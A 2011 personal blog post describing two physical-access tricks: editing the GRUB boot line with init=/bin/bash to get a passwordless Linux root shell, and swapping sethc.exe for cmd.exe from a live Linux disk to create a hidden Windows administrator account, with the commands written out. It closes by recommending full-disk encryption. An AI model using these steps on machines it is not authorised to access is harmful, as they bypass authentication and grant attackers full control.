Title: Cute Physical Access Tricks
Date: 2011-08-02 11:11
Author: isis
Category: Technology
Tags: hacking, linux, password reset, physical access tricks, privilege escalation, root shell, windows

They're cute because they're so adorably simplistic:

If you have physical access to a Linux box, do:

`Press ESC at the grub prompt.`

Press e for edit.

Highlight the line that begins kernel ………, press e

Go to the very end of the line, add rw init=/bin/bash

press enter, then press b to boot your system.

Your system will boot up to a passwordless root shell.

 

For situations with physical access to a Windows box, boot into a live
Linux USB/CD and do:

`mkdir /mnt/ntfs`

mount -t captive-ntfs /dev/hda1 /mnt/ntfs

cd /mnt/ntfs/windows/system32

mv sethc.exe sethc.old; cp cmd.exe sethc.exe

sync

cd \~

umount /mnt/ntfs

shutdown –r

Then, in the shell which appears, make an admin account by doing:

`NET USER admin password /add`

NET LOCALGROUP administrators admin /add

Of course, neither of these work if you're using full-disk encryption.
So, Windows users: [use TrueCrypt][]! And Linux users: use [ecryptfs][]
and[luks][]! Dualbooters can [use this tutorial][]. And Mac users...from
my understanding, you're fucked and there's no way to full-disk encrypt
a Mac, but I don't use Macs, so I could be wrong. Hey, it's the price
you pay for having a hipster computer. /snark!

And full-disk encryption doesn't void flaws in physical security issues,
such as presented in the Evil Maid or Cold Boot attacks. Duh. If they
can physically get to your computer, especially if they can get to it
and then come back to it later, you're still fucked.

  [use TrueCrypt]: http://www.truecrypt.org/
  [ecryptfs]: http://www.makeuseof.com/tag/encrypt-your-files-in-linux-with-ecryptfs/
  [luks]: http://www.adamsinfo.com/linux-luks-crypt-howto/
  [use this tutorial]: http://ubuntuforums.org/showthread.php?t=761530
